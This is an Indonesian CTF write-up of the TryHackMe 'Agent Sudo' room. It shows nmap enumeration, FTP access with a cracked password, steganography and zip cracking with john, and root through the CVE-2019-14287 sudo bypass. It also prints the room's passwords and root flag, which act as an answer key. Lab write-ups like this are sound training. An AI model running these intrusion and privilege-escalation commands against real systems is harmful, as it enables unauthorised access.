# Agent Sudo – TryHackMe Write-up

## 📃 Ringkasan

> Sebuah box CTF bertema intelijen rahasia, steganografi, dan privilege escalation. Tujuannya: mengumpulkan informasi rahasia dari agen, men-decode pesan tersembunyi, dan menjadi root.

---

## 🤮 Langkah 1 – Nmap Scan

```bash
nmap -sC -sV -oN agent-sudo.nmap 10.10.112.200
```

### Hasil:

* FTP (21)
* SSH (22)
* HTTP (80)

---

## 🌐 Langkah 2 – Enum Web

Pada halaman utama web:

```
Use your own codename as user-agent to access the site.
```

Ubah User-Agent ke "C":

```bash
curl -A "C" http://10.10.112.200
```

Didapat info bahwa user **chris** memiliki password lemah.

---

## 📂 Langkah 3 – Login FTP sebagai chris

```bash
ftp 10.10.112.200
Name: chris
Password: crystal
```

### File ditemukan:

* `To_agentJ.txt`
* `cutie.png`
* `cute-alien.jpg`

---

## 🧠 Langkah 4 – Analisis cutie.png (binwalk + stego)

```bash
binwalk -e --run-as=root cutie.png
```

Ditemukan file tersembunyi: `8702.zip`

### File ZIP tersebut diproteksi password:

1. Ekstrak hash:

```bash
zip2john 8702.zip > zip.hash
```

2. Jalankan john:

```bash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

3. Dapatkan password:

```bash
john zip.hash --show
```

🔐 Password ditemukan: `alien`

---

## 📄 Langkah 5 – Ekstrak ZIP (8702.zip)

```bash
7z x 8702.zip -palien
```

Ditemukan file: `To_agentR.txt`

Isi:

```
We need to send the picture to 'QXJlYTUx' as soon as possible!
```

Base64 decode:

```bash
echo QXJlYTUx | base64 -d
```

🔎 Hasil: `Area51`

---

## 📷 Langkah 6 – Steghide cute-alien.jpg

```bash
steghide extract -sf cute-alien.jpg -p Area51
```

Hasil: `message.txt`

Isi:

```
Hi james,
Glad you find this message. Your login password is hackerrules!
```

---

## 🔐 Langkah 7 – SSH Login ke james

```bash
ssh james@10.10.112.200
Password: hackerrules
```

---

## 🚀 Langkah 8 – Reverse Image: Alien\_autospy.jpg

Reverse image search: hasil = `Alien Autopsy`

Jawaban:

```
Alien Autopsy
```

---

## 📁 Langkah 9 – Cek sudo

```bash
sudo -l
```

Hasil:

```
(ALL, !root) /bin/bash
```

Artinya: tidak bisa sudo ke root, tapi bisa ke user lain (tidak berguna karena hanya ada user james)

---

## 💥 Langkah 10 – Exploit CVE-2019-14287

```bash
sudo -u#-1 /bin/bash
```

Hasil:

```bash
whoami  # root
```

---

## 🌟 Langkah 11 – Ambil root flag

```bash
cat /root/root.txt
```

Flag:

```
b53a02f55b57d4439e3341834d70c062
```

---

## 🌝 Ringkasan Teknik

| Langkah               | Teknik                     |
| --------------------- | -------------------------- |
| Enum awal             | Nmap, User-Agent trick     |
| Akses file            | FTP login                  |
| Stego                 | Steghide, binwalk          |
| Password cracking     | zip2john + john            |
| Credential harvesting | Pesan tersembunyi          |
| Privilege Escalation  | CVE-2019-14287 sudo bypass |
| Root flag             | Manual exploit → UID 0     |

---

## 🤔 Pelajaran

* Jangan gunakan password lemah
* Zip bisa menyimpan clue tersembunyi
* Sudo harus dikonfigurasi dengan aman
* Versi sudo lama rawan exploit!

---

Selesai! 🎉
